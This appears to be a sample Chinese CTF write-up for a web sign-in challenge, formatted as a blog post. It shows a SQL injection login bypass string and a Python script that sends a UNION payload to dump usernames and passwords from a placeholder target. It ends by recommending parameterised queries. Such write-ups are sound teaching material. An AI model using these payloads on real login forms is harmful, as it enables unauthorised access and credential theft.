---
title: "示例：Web 签到题 WriteUp"
description: "一篇示例 CTF WriteUp，展示代码块、公式和图片的写法"
date: 2026-08-23T20:00:00+08:00
slug: "ctf-web-signin-wp"
image: ""
math: true
categories:
    - CTF WP
tags:
    - Web
    - SQL 注入
---

## 题目描述

签到题，访问目标站点，提示「flag 在 admin 的密码里」。

## 解题过程

打开页面是一个登录框，随手测试 `admin' or '1'='1`，页面返回登录成功。

进一步用 UNION 注入dump数据：

```python
import requests

url = "http://target.example.com/login"
payload = "' union select 1,username,password from users-- -"

resp = requests.post(url, data={"username": payload, "password": "x"})
print(resp.text)
```

响应中拿到：

```text
admin | flag{w3lc0me_t0_ctf_w0rld}
```

## 原理分析

登录 SQL 拼接形如：

```sql
SELECT * FROM users WHERE username = '$u' AND password = '$p'
```

单引号闭合后注释掉后半段即可绕过。时间复杂度为 $O(n)$，其中 $n$ 为注入尝试次数。

## 总结

- 过滤单引号是治标不治本，应该用参数化查询
- 本题考点：基础 SQL 注入 + UNION 查询
